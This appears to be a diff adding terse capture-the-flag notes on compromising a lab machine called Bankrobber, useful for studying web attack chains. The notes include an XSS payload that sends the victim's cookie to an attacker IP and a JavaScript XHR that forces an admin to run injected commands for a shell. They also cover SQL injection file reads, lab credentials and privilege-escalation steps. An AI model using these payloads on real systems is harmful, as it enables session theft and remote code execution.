@@ -1,0 +1,65 @@
+# Keywords
+client-side attack; XSS
+
+# Init
+
+## nmap
+open ports 80, 443, 445, 3306(mysql)
+
+## 80
+gobuster=>
+admin/ => not authed
+notes.txt =>
+- Move all files from the default Xampp folder: TODO
+- Encode comments for every IP address except localhost: Done
+- Take a break..
+phpmyadmin/ => not allowed
+
+XSS, client-side attack, in the transfer text field after login.
+<img src=x onerror=this.src="http://10.10.14.19/test.php?c="%2bbtoa(document.cookie) />
+=>
+admin:Hopelessromantic
+login to admin page.
+find one cmd console field, but only take commands from localhost.
+find a user query field, sqli, load_file() with default xampp path => read access.
+
+read link.php => 
+"
+$user = 'root';
+$pass = 'Welkom1!';
+$dsn = "mysql:host=127.0.0.1;dbname=bankrobber;";
+"
+
+check web console => backdoorchecker.php.
+need XSS again to make admin execute cmd.
+(from ippsec)
+'''
+var xhr = new XMLHttpRequest();
+var url = 'http://10.10.10.154/admin/backdoorchecker.php';
+var params = 'cmd=dir | ping -n 1 10.10.14.19';
+xhr.open("POST", url);
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.withCredentials = true;
+xhr.send(params);
+'''
+=> get confirmed
+
+replace to powershell => get shell
+
+## 443
+not difference from 80.
+
+## 445
+nothing
+crackmapexec tells the host name is "bankrobber".
+
+## 3306
+my ip is not allowed
+
+# Priv Esc
+## basic
+find 910, use chisel to set up forwarding.
+
+msf-pattern_*
+cp windows nc.exe by impacket-smbserver share
+=> root
